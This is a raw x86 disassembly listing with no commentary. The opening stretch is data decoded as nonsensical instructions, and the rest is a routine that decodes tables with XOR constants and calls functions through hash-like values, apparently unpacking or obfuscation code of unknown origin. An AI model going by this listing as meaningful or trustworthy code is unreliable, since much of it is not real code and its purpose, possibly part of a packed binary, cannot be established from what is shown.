  43cb39:	add    BYTE PTR [eax],al
  43cb3b:	and    al,BYTE PTR [eax]
  43cb3d:	mov    ecx,0x15fd00
  43cb42:	or     eax,0x0
  43cb45:	test   DWORD PTR [eax],0xff837214
  43cb4b:	aas    
  43cb4c:	jmp    DWORD PTR [ecx-0x1]
  43cb4f:	add    ebx,DWORD PTR [eax+0xd7ff00]
  43cb55:	test   eax,0xffd7d683
  43cb5a:	push   esp
  43cb5c:	push   DWORD PTR [esp+ecx*8]
  43cb5f:	xlat   BYTE PTR ds:[ebx]
  43cb60:	jnp    0x43cb61
  43cb62:	inc    DWORD PTR [edi]
  43cb64:	call   FWORD PTR [edx-0x8b8601]
  43cb6a:	call   DWORD PTR [eax-0x7d]
  43cb6d:	sahf   
  43cb6e:	xor    DWORD PTR [edx],0xc
  43cb71:	(bad)  
  43cb72:	inc    DWORD PTR [ebp-0x1]
  43cb75:	sub    al,0xff
  43cb77:	mov    ch,0x2
  43cb79:	int3   
  43cb7a:	adc    DWORD PTR [ebx-0x77],0xffffffe1
  43cb7e:	int3   
  43cb7f:	xchg   ebp,eax
  43cb80:	xor    al,0x83
  43cb82:	call   DWORD PTR [edi+0x0]
  43cb85:	out    0xff,al
  43cb87:	stos   BYTE PTR es:[edi],al
  43cb88:	(bad)  
  43cb89:	add    bh,bh
  43cb8b:	jge    0x43cb10
  43cb8d:	mov    edi,edi
  43cb8f:	cli    
  43cb90:	xchg   esp,eax
  43cb91:	(bad)  
  43cb92:	call   edx
  43cb94:	add    BYTE PTR [edi+edi*8],bh
  43cb97:	outs   dx,DWORD PTR ds:[esi]
  43cb98:	outs   dx,DWORD PTR ds:[esi]
  43cb99:	int3   
  43cb9a:	add    BYTE PTR [eax-0x3b00bb01],ch
  43cba0:	add    eax,0x1e83ff
  43cba5:	xor    bh,bh
  43cba7:	mov    ebx,0xbc000070
  43cbac:	int3   
  43cbad:	mov    bh,0x89
  43cbaf:	xor    BYTE PTR [eax+0x5189ff],0xd9
  43cbb6:	dec    DWORD PTR [ecx]
  43cbb8:	das    
  43cbb9:	(bad)  
  43cbba:	jmp    DWORD PTR [ebx-0x1d765801]
  43cbc0:	popa   
  43cbc1:	add    BYTE PTR [ebx-0x6400ad],al
  43cbc7:	xor    eax,0xe800ccd2
  43cbcc:	add    BYTE PTR [edi],ah
  43cbce:	(bad)  
  43cbcf:	js     0x43cbf5
  43cbd1:	cmp    edi,0x1b
  43cbd4:	mov    DWORD PTR ds:0x834220ff,ebp
  43cbda:	int3   
  43cbdb:	scas   eax,DWORD PTR es:[edi]
  43cbdc:	jmp    DWORD PTR [edx-0x7d]
  43cbdf:	lods   al,BYTE PTR ds:[esi]
  43cbe0:	sbb    ah,cl
  43cbe2:	and    DWORD PTR [edi+edi*8+0x7d],0xffffffff
  43cbe7:	push   esi
  43cbe8:	call   0xff32:0x837fff00
  43cbef:	and    eax,0x5cc0021
  43cbf4:	add    BYTE PTR [edi-0x1],dl
  43cbf7:	mov    ah,0x15
  43cbf9:	inc    DWORD PTR [eax]
  43cbfb:	and    edi,edi
  43cbfd:	sub    BYTE PTR [eax],al
  43cbff:	rol    BYTE PTR [ebp+0xff00],1
  43cc05:	adc    DWORD PTR [ecx+0xffdf59],ecx
  43cc0b:	fwait
  43cc0c:	jmp    FWORD PTR [ebx+eax*4-0x65]
  43cc10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cc11:	add    bh,bh
  43cc13:	sbb    al,0x89
  43cc15:	mov    cl,0xff
  43cc17:	hlt    
  43cc18:	mov    DWORD PTR [eax],0x8a00e9ff
  43cc1e:	call   FWORD PTR [esi+edi*8-0x1]
  43cc22:	jmp    DWORD PTR [ebp-0x38337a00]
  43cc28:	lods   eax,DWORD PTR ds:[esi]
  43cc29:	add    ah,cl
  43cc2b:	xor    edi,edi
  43cc2d:	fld    QWORD PTR [ebx+0x6043]
  43cc33:	mov    al,ds:0xda89a4ff
  43cc38:	test   eax,0x83a78900
  43cc3d:	and    al,0x0
  43cc3f:	mov    ds:0xd0ffff08,eax
  43cc44:	int3   
  43cc45:	sahf   
  43cc46:	add    BYTE PTR [edi*4-0x100001],cl
  43cc4d:	cmp    edi,0xe5d6
  43cc53:	jge    0x43cc54
  43cc55:	idiv   bh
  43cc57:	aad    0xd5
  43cc59:	(bad)  
  43cc5a:	jmp    DWORD PTR [edx+0x32ffaa00]
  43cc60:	ins    BYTE PTR es:[edi],dx
  43cc61:	dec    DWORD PTR [ecx-0x767c69]
  43cc67:	in     al,dx
  43cc68:	ins    BYTE PTR es:[edi],dx
  43cc69:	(bad)  
  43cc6a:	push   DWORD PTR [esi]
  43cc6c:	(bad)  
  43cc6d:	fdivp  st(7),st
  43cc6f:	jl     0x43cc11
  43cc71:	add    BYTE PTR [ebx+0xf0ff0a],al
  43cc77:	frstor [ebp-0x1]
  43cc7a:	jmp    FWORD PTR [eax]
  43cc7c:	add    BYTE PTR [ebx-0x7cf63401],ch
  43cc82:	mov    edx,edx
  43cc84:	add    BYTE PTR [eax-0xdb3801],dh
  43cc8a:	add    ch,bl
  43cc8c:	inc    ebp
  43cc8e:	int3   
  43cc8f:	add    cl,bl
  43cc91:	add    BYTE PTR [eax],al
  43cc93:	fild   DWORD PTR [ebx-0x58c700bc]
  43cc99:	inc    DWORD PTR [eax]
  43cc9b:	xchg   esi,eax
  43cc9c:	(bad)  
  43cc9d:	cmp    edi,edi
  43cc9f:	gs cdq 
  43cca1:	or     esp,0xffffffd6
  43cca4:	add    bh,ch
  43cca6:	call   DWORD PTR [esi]
  43cca8:	(bad)  
  43cca9:	inc    DWORD PTR [eax]
  43ccab:	push   esi
  43ccac:	int3   
  43ccad:	ss add bh,dl
  43ccb0:	cdq    
  43ccb1:	add    BYTE PTR [eax],al
  43ccb3:	retf   0x52ff
  43ccb6:	dec    DWORD PTR ds:0x1900006c
  43ccbc:	call   DWORD PTR [edx-0x7d]
  43ccbf:	or     BYTE PTR ds:0x83ed0083,dl
  43ccc5:	sar    bh,cl
  43ccc7:	adc    DWORD PTR [eax],ebp
  43ccc9:	(bad)  
  43ccca:	(bad)  
  43cccb:	fld    QWORD PTR [eax]
  43cccd:	mov    esp,0xff9aae83
  43ccd2:	add    dl,cl
  43ccd4:	add    BYTE PTR [ecx+ecx*4+0x32],dh
  43ccd8:	sbb    al,0x0
  43ccda:	push   DWORD PTR [ebx+0x6983cdff]
  43cce0:	push   ebp
  43cce1:	inc    DWORD PTR [ebx-0xf33335]
  43cce7:	xchg   cx,ax
  43cce9:	add    DWORD PTR [ebx-0xdc0098],0x18
  43ccf0:	jnp    0x43ccf1
  43ccf2:	add    BYTE PTR [edi+0x19ff97cc],cl
  43ccf8:	(bad)  
  43ccf9:	inc    DWORD PTR [ebx-0x7cb8ff4d]
  43ccff:	jne    0x43cd68
  43cd01:	dec    esp
  43cd03:	add    BYTE PTR [eax],0xc4
  43cd06:	(bad)  
  43cd07:	mov    eax,0x1700897a
  43cd0c:	inc    esp
  43cd0e:	call   DWORD PTR [ebx]
  43cd10:	dec    ebx
  43cd11:	add    bh,bh
  43cd13:	inc    ebp
  43cd14:	add    BYTE PTR [ecx+0xb4dff],dh
  43cd1a:	push   eax
  43cd1c:	dec    DWORD PTR [ebp+0xa3a400]
  43cd22:	sub    DWORD PTR [edi+edi*8-0x2d],0x0
  43cd27:	stc    
  43cd28:	sbb    ecx,esp
  43cd2a:	jmp    DWORD PTR [ebx+0x40ff34cc]
  43cd30:	int    0x83
  43cd32:	add    BYTE PTR [eax-0x1],ah
  43cd35:	cmc    
  43cd36:	dec    DWORD PTR [ebx-0x1c7c0094]
  43cd3c:	mov    edx,ebp
  43cd3e:	add    al,ch
  43cd40:	jno    0x43cd41
  43cd42:	add    BYTE PTR [ebp+0x0],al
  43cd45:	fcos   
  43cd47:	ja     0x43ccdb
  43cd49:	add    bh,bh
  43cd4b:	(bad)  
  43cd4c:	jmp    DWORD PTR [edi+0x0]
  43cd4f:	adc    esi,DWORD PTR [edi+0x0]
  43cd52:	add    BYTE PTR [ebx-0x1],ah
  43cd55:	ltr    WORD PTR [ecx-0x3e0000d1]
  43cd5c:	(bad)  
  43cd5d:	fdiv   st(7),st
  43cd5f:	or     ch,BYTE PTR [ebx+0xc889ff]
  43cd65:	adc    cl,ah
  43cd67:	test   BYTE PTR [ecx-0x1],bl
  43cd6a:	int3   
  43cd6b:	or     BYTE PTR [ebx+0x13eeffaa],al
  43cd71:	add    bh,bh
  43cd73:	or     eax,0x42ff0583
  43cd78:	out    dx,al
  43cd79:	(bad)  
  43cd7a:	(bad)  
  43cd7b:	cmp    cl,BYTE PTR [ecx-0x548200f7]
  43cd81:	add    BYTE PTR [eax],al
  43cd83:	pop    edi
  43cd84:	add    ch,dl
  43cd86:	add    bl,cl
  43cd88:	int3   
  43cd89:	int3   
  43cd8a:	int3   
  43cd8b:	int3   
  43cd8c:	int3   
  43cd8d:	int3   
  43cd8e:	int3   
  43cd8f:	int3   
  43cd90:	sub    esp,0x15c
  43cd96:	push   ebx
  43cd97:	push   ebp
  43cd98:	push   esi
  43cd99:	push   edi
  43cd9a:	push   0x24
  43cd9c:	call   DWORD PTR ds:0x445064
  43cda2:	call   0x43b0e0
  43cda7:	mov    esi,DWORD PTR ds:0x448d20
  43cdad:	mov    ebx,DWORD PTR ds:0x445020
  43cdb3:	mov    ebp,DWORD PTR ds:0x44501c
  43cdb9:	mov    eax,ds:0x4480f4
  43cdbe:	add    esi,0x2b50
  43cdc4:	mov    edi,0xec
  43cdc9:	lea    esp,[esp+0x0]
  43cdd0:	movzx  ecx,BYTE PTR [eax+0x6]
  43cdd4:	movzx  edx,WORD PTR [eax+0x4]
  43cdd8:	movzx  eax,BYTE PTR [eax+0x2]
  43cddc:	shl    ecx,0x10
  43cddf:	add    ecx,edx
  43cde1:	shl    ecx,0x8
  43cde4:	add    ecx,eax
  43cde6:	mov    DWORD PTR ds:0x448d10,ecx
  43cdec:	lea    ecx,[esp+0x20]
  43cdf0:	push   ecx
  43cdf1:	lea    edx,[esp+0x14]
  43cdf5:	push   edx
  43cdf6:	lea    eax,[esp+0x20]
  43cdfa:	push   eax
  43cdfb:	lea    ecx,[esp+0x34]
  43cdff:	push   ecx
  43ce00:	push   0xaf7670e7
  43ce05:	call   ebx
  43ce07:	mov    edx,DWORD PTR ds:0x448d1c
  43ce0d:	xor    edx,DWORD PTR ds:0x448d10
  43ce13:	xor    edx,0xa30f08a8
  43ce19:	mov    DWORD PTR [esi],edx
  43ce1b:	mov    eax,ds:0x4480f4
  43ce20:	movzx  ecx,BYTE PTR [eax+0xf]
  43ce24:	movzx  edx,BYTE PTR [eax+0x9]
  43ce28:	movzx  eax,WORD PTR [eax+0x7]
  43ce2c:	shl    ecx,0x8
  43ce2f:	add    ecx,edx
  43ce31:	shl    ecx,0x10
  43ce34:	add    ecx,eax
  43ce36:	mov    DWORD PTR ds:0x448d10,ecx
  43ce3c:	lea    ecx,[esp+0x50]
  43ce40:	push   ecx
  43ce41:	push   0x0
  43ce43:	push   0x3
  43ce45:	call   ebp
  43ce47:	mov    edx,DWORD PTR ds:0x448d1c
  43ce4d:	add    edx,0xa3070768
  43ce53:	xor    edx,DWORD PTR ds:0x448d10
  43ce59:	add    esi,0x8
  43ce5c:	mov    DWORD PTR [esi-0x4],edx
  43ce5f:	mov    eax,ds:0x4480f4
  43ce64:	add    eax,0x10
  43ce67:	dec    edi
  43ce68:	mov    ds:0x4480f4,eax
  43ce6d:	jne    0x43cdd0
  43ce73:	mov    esi,DWORD PTR ds:0x448d20
  43ce79:	mov    ecx,DWORD PTR ds:0x4480f8
  43ce7f:	add    esi,0x32b0
  43ce85:	mov    edi,0xde
  43ce8a:	lea    ebx,[ebx+0x0]
  43ce90:	movzx  eax,BYTE PTR [ecx+0x6]
  43ce94:	movzx  edx,BYTE PTR [ecx+0x4]
  43ce98:	movzx  ecx,WORD PTR [ecx+0x1]
  43ce9c:	shl    eax,0x8
  43ce9f:	add    eax,edx
  43cea1:	shl    eax,0x10
  43cea4:	add    eax,ecx
  43cea6:	mov    ds:0x448d10,eax
  43ceab:	mov    edx,0x5a3a3734
  43ceb0:	sub    edx,DWORD PTR ds:0x448d1c
  43ceb6:	add    esi,0x8
  43ceb9:	xor    edx,eax
  43cebb:	mov    DWORD PTR [esi-0x8],edx
  43cebe:	mov    ecx,DWORD PTR ds:0x4480f8
  43cec4:	movzx  eax,BYTE PTR [ecx+0xe]
  43cec8:	movzx  edx,WORD PTR [ecx+0xb]
  43cecc:	movzx  ecx,BYTE PTR [ecx+0x8]
  43ced0:	shl    eax,0x10
  43ced3:	add    eax,edx
  43ced5:	mov    edx,DWORD PTR ds:0x448d1c
  43cedb:	shl    eax,0x8
  43cede:	add    eax,ecx
  43cee0:	add    edx,0x5a323368
  43cee6:	xor    edx,eax
  43cee8:	mov    ds:0x448d10,eax
  43ceed:	lea    eax,[esp+0x30]
  43cef1:	push   eax
  43cef2:	mov    DWORD PTR [esi-0x4],edx
  43cef5:	lea    ecx,[esp+0x4c]
  43cef9:	push   ecx
  43cefa:	lea    edx,[esp+0x40]
  43cefe:	push   edx
  43ceff:	lea    eax,[esp+0x4c]
  43cf03:	push   eax
  43cf04:	push   0xf5a23ae
  43cf09:	call   ebx
  43cf0b:	mov    ecx,DWORD PTR ds:0x4480f8
  43cf11:	add    ecx,0x10
  43cf14:	dec    edi
  43cf15:	mov    DWORD PTR ds:0x4480f8,ecx
  43cf1b:	jne    0x43ce90
  43cf21:	movzx  eax,BYTE PTR [ecx+0x6]
  43cf25:	movzx  edx,BYTE PTR [ecx+0x4]
  43cf29:	movzx  ecx,WORD PTR [ecx+0x1]
  43cf2d:	shl    eax,0x8
  43cf30:	add    eax,edx
  43cf32:	shl    eax,0x10
  43cf35:	add    eax,ecx
  43cf37:	mov    edx,0x5a3a3734
  43cf3c:	sub    edx,DWORD PTR ds:0x448d1c
  43cf42:	mov    ds:0x448d10,eax
  43cf47:	xor    edx,eax
  43cf49:	mov    DWORD PTR [esi],edx
  43cf4b:	mov    esi,DWORD PTR ds:0x448d20
  43cf51:	mov    ecx,DWORD PTR ds:0x4480fc
  43cf57:	add    esi,0x39a4
  43cf5d:	mov    edi,0x205
  43cf62:	movzx  eax,BYTE PTR [ecx+0x7]
  43cf66:	movzx  edx,WORD PTR [ecx+0x4]
  43cf6a:	movzx  ecx,BYTE PTR [ecx]
  43cf6d:	shl    eax,0x10
  43cf70:	add    eax,edx
  43cf72:	mov    edx,DWORD PTR ds:0x448d1c
  43cf78:	shl    eax,0x8
  43cf7b:	add    eax,ecx
  43cf7d:	add    edx,0xb2e43d5
  43cf83:	mov    ds:0x448d10,eax
  43cf88:	xor    edx,eax
  43cf8a:	lea    eax,[esp+0x50]
  43cf8e:	push   eax
  43cf8f:	push   0x0
  43cf91:	mov    DWORD PTR [esi],edx
  43cf93:	push   0x3
  43cf95:	add    esi,0x4
  43cf98:	call   ebp
  43cf9a:	mov    ecx,DWORD PTR ds:0x4480fc
  43cfa0:	add    ecx,0x8
  43cfa3:	dec    edi
  43cfa4:	mov    DWORD PTR ds:0x4480fc,ecx
  43cfaa:	jne    0x43cf62
  43cfac:	mov    edx,DWORD PTR ds:0x448d20
  43cfb2:	mov    eax,DWORD PTR [esp+0x170]
  43cfb9:	add    edx,0x41b8
  43cfbf:	add    eax,0x2
  43cfc2:	lea    esi,[edi+0x4a]
  43cfc5:	movzx  ecx,WORD PTR [eax+0x2]
  43cfc9:	movzx  edi,BYTE PTR [eax]
  43cfcc:	shl    ecx,0x8
  43cfcf:	add    ecx,edi
  43cfd1:	movzx  edi,BYTE PTR [eax-0x2]
  43cfd5:	shl    ecx,0x8
  43cfd8:	add    ecx,edi
  43cfda:	mov    edi,DWORD PTR ds:0x448d1c
  43cfe0:	mov    DWORD PTR ds:0x448d10,ecx
  43cfe6:	add    edi,0xe5fa196b
  43cfec:	xor    edi,ecx
  43cfee:	mov    DWORD PTR [edx],edi
  43cff0:	movzx  ecx,WORD PTR [eax+0xa]
  43cff4:	movzx  edi,BYTE PTR [eax+0x8]
  43cff8:	shl    ecx,0x8
  43cffb:	add    ecx,edi
  43cffd:	movzx  edi,BYTE PTR [eax+0x6]
  43d001:	shl    ecx,0x8
  43d004:	add    ecx,edi
  43d006:	mov    edi,DWORD PTR ds:0x448d1c
  43d00c:	mov    DWORD PTR ds:0x448d10,ecx
  43d012:	add    edi,0xe5fa196b
  43d018:	xor    edi,ecx
  43d01a:	mov    DWORD PTR [edx+0x4],edi
  43d01d:	movzx  ecx,WORD PTR [eax+0x12]
  43d021:	movzx  edi,BYTE PTR [eax+0x10]
  43d025:	shl    ecx,0x8
  43d028:	add    ecx,edi
  43d02a:	movzx  edi,BYTE PTR [eax+0xe]
  43d02e:	shl    ecx,0x8
  43d031:	add    ecx,edi
  43d033:	mov    edi,DWORD PTR ds:0x448d1c
  43d039:	mov    DWORD PTR ds:0x448d10,ecx
  43d03f:	add    edi,0xe5fa196b
  43d045:	xor    edi,ecx
  43d047:	mov    DWORD PTR [edx+0x8],edi
  43d04a:	movzx  ecx,WORD PTR [eax+0x1a]
  43d04e:	movzx  edi,BYTE PTR [eax+0x18]
  43d052:	shl    ecx,0x8
  43d055:	add    ecx,edi
  43d057:	movzx  edi,BYTE PTR [eax+0x16]
  43d05b:	shl    ecx,0x8
  43d05e:	add    ecx,edi
  43d060:	mov    edi,DWORD PTR ds:0x448d1c
  43d066:	add    edi,0xe5fa196b
  43d06c:	xor    edi,ecx
  43d06e:	mov    DWORD PTR ds:0x448d10,ecx
  43d074:	mov    DWORD PTR [edx+0xc],edi
  43d077:	add    eax,0x20
  43d07a:	add    edx,0x10
  43d07d:	dec    esi
  43d07e:	jne    0x43cfc5
  43d084:	call   0x416d90
  43d089:	mov    eax,ds:0x448d20
  43d08e:	mov    edx,DWORD PTR ds:0x448100
  43d094:	add    eax,0x1408
  43d099:	mov    esi,0x20
  43d09e:	mov    edi,edi
  43d0a0:	movzx  ecx,BYTE PTR [edx+0x6]
  43d0a4:	movzx  edi,BYTE PTR [edx+0x4]
  43d0a8:	movzx  edx,WORD PTR [edx+0x2]
  43d0ac:	shl    ecx,0x8
  43d0af:	add    ecx,edi
  43d0b1:	shl    ecx,0x10
  43d0b4:	add    ecx,edx
  43d0b6:	mov    DWORD PTR ds:0x448d10,ecx
  43d0bc:	mov    edx,0xa9e99fc9
  43d0c1:	sub    edx,DWORD PTR ds:0x448d1c
  43d0c7:	xor    edx,ecx
  43d0c9:	mov    DWORD PTR [eax],edx
  43d0cb:	mov    edx,DWORD PTR ds:0x448100
  43d0d1:	movzx  ecx,BYTE PTR [edx+0xd]
  43d0d5:	movzx  edi,BYTE PTR [edx+0xb]
  43d0d9:	movzx  edx,WORD PTR [edx+0x9]
  43d0dd:	shl    ecx,0x8
  43d0e0:	add    ecx,edi
  43d0e2:	shl    ecx,0x10
  43d0e5:	add    ecx,edx
  43d0e7:	mov    edx,DWORD PTR ds:0x448d1c
  43d0ed:	xor    edx,ecx
  43d0ef:	mov    DWORD PTR ds:0x448d10,ecx
  43d0f5:	xor    edx,0xa9e19c05
  43d0fb:	mov    DWORD PTR [eax+0x4],edx
  43d0fe:	mov    edx,DWORD PTR ds:0x448100
  43d104:	add    edx,0x10
  43d107:	mov    DWORD PTR ds:0x448100,edx
  43d10d:	movzx  ecx,BYTE PTR [edx+0x6]
  43d111:	movzx  edi,BYTE PTR [edx+0x4]
  43d115:	movzx  edx,WORD PTR [edx+0x2]
  43d119:	shl    ecx,0x8
  43d11c:	add    ecx,edi
  43d11e:	shl    ecx,0x10
  43d121:	add    ecx,edx
  43d123:	mov    DWORD PTR ds:0x448d10,ecx
  43d129:	mov    edx,0xa9e99fc9
  43d12e:	sub    edx,DWORD PTR ds:0x448d1c
  43d134:	xor    edx,ecx
  43d136:	mov    DWORD PTR [eax+0x8],edx
  43d139:	mov    edx,DWORD PTR ds:0x448100
  43d13f:	movzx  ecx,BYTE PTR [edx+0xd]
  43d143:	movzx  edi,BYTE PTR [edx+0xb]
  43d147:	movzx  edx,WORD PTR [edx+0x9]
  43d14b:	shl    ecx,0x8
  43d14e:	add    ecx,edi
  43d150:	shl    ecx,0x10
  43d153:	add    ecx,edx
  43d155:	mov    edx,DWORD PTR ds:0x448d1c
  43d15b:	xor    edx,ecx
  43d15d:	mov    DWORD PTR ds:0x448d10,ecx
  43d163:	xor    edx,0xa9e19c05
  43d169:	mov    DWORD PTR [eax+0xc],edx
  43d16c:	mov    edx,DWORD PTR ds:0x448100
  43d172:	add    edx,0x10
  43d175:	mov    DWORD PTR ds:0x448100,edx
  43d17b:	movzx  ecx,BYTE PTR [edx+0x6]
  43d17f:	movzx  edi,BYTE PTR [edx+0x4]
  43d183:	movzx  edx,WORD PTR [edx+0x2]
  43d187:	shl    ecx,0x8
  43d18a:	add    ecx,edi
  43d18c:	shl    ecx,0x10
  43d18f:	add    ecx,edx
  43d191:	mov    DWORD PTR ds:0x448d10,ecx
  43d197:	mov    edx,0xa9e99fc9
  43d19c:	sub    edx,DWORD PTR ds:0x448d1c
  43d1a2:	xor    edx,ecx
  43d1a4:	mov    DWORD PTR [eax+0x10],edx
  43d1a7:	mov    edx,DWORD PTR ds:0x448100
  43d1ad:	movzx  ecx,BYTE PTR [edx+0xd]
  43d1b1:	movzx  edi,BYTE PTR [edx+0xb]
  43d1b5:	movzx  edx,WORD PTR [edx+0x9]
  43d1b9:	shl    ecx,0x8
  43d1bc:	add    ecx,edi
  43d1be:	shl    ecx,0x10
  43d1c1:	add    ecx,edx
  43d1c3:	mov    edx,DWORD PTR ds:0x448d1c
  43d1c9:	xor    edx,ecx
  43d1cb:	xor    edx,0xa9e19c05
  43d1d1:	mov    DWORD PTR ds:0x448d10,ecx
  43d1d7:	mov    DWORD PTR [eax+0x14],edx
  43d1da:	mov    edx,DWORD PTR ds:0x448100
  43d1e0:	add    edx,0x10
  43d1e3:	mov    DWORD PTR ds:0x448100,edx
  43d1e9:	movzx  ecx,BYTE PTR [edx+0x6]
  43d1ed:	movzx  edi,BYTE PTR [edx+0x4]
  43d1f1:	movzx  edx,WORD PTR [edx+0x2]
  43d1f5:	shl    ecx,0x8
  43d1f8:	add    ecx,edi
  43d1fa:	shl    ecx,0x10
  43d1fd:	add    ecx,edx
  43d1ff:	mov    DWORD PTR ds:0x448d10,ecx
  43d205:	mov    edx,0xa9e99fc9
  43d20a:	sub    edx,DWORD PTR ds:0x448d1c
  43d210:	add    eax,0x20
  43d213:	xor    edx,ecx
  43d215:	mov    DWORD PTR [eax-0x8],edx
  43d218:	mov    edx,DWORD PTR ds:0x448100
  43d21e:	movzx  ecx,BYTE PTR [edx+0xd]
  43d222:	movzx  edi,BYTE PTR [edx+0xb]
  43d226:	movzx  edx,WORD PTR [edx+0x9]
  43d22a:	shl    ecx,0x8
  43d22d:	add    ecx,edi
  43d22f:	shl    ecx,0x10
  43d232:	add    ecx,edx
  43d234:	mov    edx,DWORD PTR ds:0x448d1c
  43d23a:	xor    edx,ecx
  43d23c:	xor    edx,0xa9e19c05
  43d242:	mov    DWORD PTR ds:0x448d10,ecx
  43d248:	mov    DWORD PTR [eax-0x4],edx
  43d24b:	mov    edx,DWORD PTR ds:0x448100
  43d251:	add    edx,0x10
  43d254:	dec    esi
  43d255:	mov    DWORD PTR ds:0x448100,edx
  43d25b:	jne    0x43d0a0
  43d261:	mov    esi,DWORD PTR ds:0x448d20
  43d267:	lea    eax,[esp+0x50]
  43d26b:	push   eax
  43d26c:	push   0x0
  43d26e:	push   0x3
  43d270:	add    esi,0x1808
  43d276:	call   ebp
  43d278:	mov    eax,ds:0x448104
  43d27d:	mov    edi,0x10c
  43d282:	movzx  ecx,WORD PTR [eax+0x6]
  43d286:	movzx  edx,BYTE PTR [eax+0x4]
  43d28a:	movzx  eax,BYTE PTR [eax+0x2]
  43d28e:	shl    ecx,0x8
  43d291:	add    ecx,edx
  43d293:	shl    ecx,0x8
  43d296:	add    ecx,eax
  43d298:	mov    DWORD PTR ds:0x448d10,ecx
  43d29e:	lea    ecx,[esp+0x20]
  43d2a2:	push   ecx
  43d2a3:	lea    edx,[esp+0x14]
  43d2a7:	push   edx
  43d2a8:	lea    eax,[esp+0x20]
  43d2ac:	push   eax
  43d2ad:	lea    ecx,[esp+0x34]
  43d2b1:	push   ecx
  43d2b2:	push   0xaf7670e7
  43d2b7:	call   ebx
  43d2b9:	mov    edx,DWORD PTR ds:0x448d1c
  43d2bf:	add    edx,0x235bf875
  43d2c5:	xor    edx,DWORD PTR ds:0x448d10
  43d2cb:	add    esi,0x8
  43d2ce:	mov    DWORD PTR [esi-0x8],edx
  43d2d1:	mov    ecx,DWORD PTR ds:0x448104
  43d2d7:	movzx  eax,BYTE PTR [ecx+0xf]
  43d2db:	movzx  edx,BYTE PTR [ecx+0xc]
  43d2df:	movzx  ecx,WORD PTR [ecx+0xa]
  43d2e3:	shl    eax,0x8
  43d2e6:	add    eax,edx
  43d2e8:	mov    edx,DWORD PTR ds:0x448d1c
  43d2ee:	shl    eax,0x10
  43d2f1:	add    eax,ecx
  43d2f3:	add    edx,0x235bf875
  43d2f9:	xor    edx,eax
  43d2fb:	mov    ds:0x448d10,eax
  43d300:	mov    DWORD PTR [esi-0x4],edx
  43d303:	mov    eax,ds:0x448104
  43d308:	add    eax,0x10
  43d30b:	dec    edi
  43d30c:	mov    ds:0x448104,eax
  43d311:	jne    0x43d282
  43d317:	movzx  ecx,WORD PTR [eax+0x6]
  43d31b:	movzx  edx,BYTE PTR [eax+0x4]
  43d31f:	movzx  eax,BYTE PTR [eax+0x2]
  43d323:	shl    ecx,0x8
  43d326:	add    ecx,edx
  43d328:	mov    edx,DWORD PTR ds:0x448d1c
  43d32e:	shl    ecx,0x8
  43d331:	add    ecx,eax
  43d333:	lea    eax,[esp+0x50]
  43d337:	push   eax
  43d338:	xor    edx,ecx
  43d33a:	push   edi
  43d33b:	xor    edx,0x235bfbbd
  43d341:	mov    DWORD PTR ds:0x448d10,ecx
  43d347:	push   0x3
  43d349:	mov    DWORD PTR [esi],edx
  43d34b:	call   ebp
  43d34d:	mov    eax,ds:0x448d20
  43d352:	mov    edx,DWORD PTR ds:0x448108
  43d358:	add    eax,0x206c
  43d35d:	lea    esi,[edi+0x3a]
  43d360:	movzx  ecx,WORD PTR [edx+0x6]
  43d364:	movzx  edi,BYTE PTR [edx+0x3]
  43d368:	movzx  edx,BYTE PTR [edx]
  43d36b:	shl    ecx,0x8
  43d36e:	add    ecx,edi
  43d370:	shl    ecx,0x8
  43d373:	add    ecx,edx
  43d375:	mov    DWORD PTR ds:0x448d10,ecx
  43d37b:	mov    edx,0xb5cc19a6
  43d380:	sub    edx,DWORD PTR ds:0x448d1c
  43d386:	xor    edx,ecx
  43d388:	mov    DWORD PTR [eax],edx
  43d38a:	mov    edx,DWORD PTR ds:0x448108
  43d390:	movzx  ecx,BYTE PTR [edx+0xf]
  43d394:	movzx  edi,BYTE PTR [edx+0xd]
  43d398:	movzx  edx,WORD PTR [edx+0xb]
  43d39c:	shl    ecx,0x8
  43d39f:	add    ecx,edi
  43d3a1:	shl    ecx,0x10
  43d3a4:	add    ecx,edx
  43d3a6:	mov    edx,DWORD PTR ds:0x448d1c
  43d3ac:	sub    edx,0x401e6
  43d3b2:	neg    edx
  43d3b4:	sbb    edx,edx
  43d3b6:	mov    DWORD PTR ds:0x448d10,ecx
  43d3bc:	and    edx,0x4a38e2e1
  43d3c2:	add    edx,0xb5c817c0
  43d3c8:	xor    edx,ecx
  43d3ca:	mov    DWORD PTR [eax+0x4],edx
  43d3cd:	mov    edx,DWORD PTR ds:0x448108
  43d3d3:	add    edx,0x10
  43d3d6:	mov    DWORD PTR ds:0x448108,edx
  43d3dc:	movzx  ecx,WORD PTR [edx+0x6]
  43d3e0:	movzx  edi,BYTE PTR [edx+0x3]
  43d3e4:	movzx  edx,BYTE PTR [edx]
  43d3e7:	shl    ecx,0x8
  43d3ea:	add    ecx,edi
  43d3ec:	shl    ecx,0x8
  43d3ef:	add    ecx,edx
  43d3f1:	mov    DWORD PTR ds:0x448d10,ecx
  43d3f7:	mov    edx,0xb5cc19a6
  43d3fc:	sub    edx,DWORD PTR ds:0x448d1c
  43d402:	xor    edx,ecx
  43d404:	mov    DWORD PTR [eax+0x8],edx
  43d407:	mov    edx,DWORD PTR ds:0x448108
  43d40d:	movzx  ecx,BYTE PTR [edx+0xf]
  43d411:	movzx  edi,BYTE PTR [edx+0xd]
  43d415:	movzx  edx,WORD PTR [edx+0xb]
  43d419:	shl    ecx,0x8
  43d41c:	add    ecx,edi
  43d41e:	shl    ecx,0x10
  43d421:	add    ecx,edx
  43d423:	mov    edx,DWORD PTR ds:0x448d1c
  43d429:	sub    edx,0x401e6
  43d42f:	neg    edx
  43d431:	sbb    edx,edx
  43d433:	and    edx,0x4a38e2e1
  43d439:	mov    DWORD PTR ds:0x448d10,ecx
  43d43f:	add    edx,0xb5c817c0
  43d445:	xor    edx,ecx
  43d447:	mov    DWORD PTR [eax+0xc],edx
  43d44a:	mov    edx,DWORD PTR ds:0x448108
  43d450:	add    edx,0x10
  43d453:	mov    DWORD PTR ds:0x448108,edx
  43d459:	movzx  ecx,WORD PTR [edx+0x6]
  43d45d:	movzx  edi,BYTE PTR [edx+0x3]
  43d461:	movzx  edx,BYTE PTR [edx]
  43d464:	shl    ecx,0x8
  43d467:	add    ecx,edi
  43d469:	shl    ecx,0x8
  43d46c:	add    ecx,edx
  43d46e:	mov    edx,0xb5cc19a6
  43d473:	sub    edx,DWORD PTR ds:0x448d1c
  43d479:	mov    DWORD PTR ds:0x448d10,ecx
  43d47f:	xor    edx,ecx
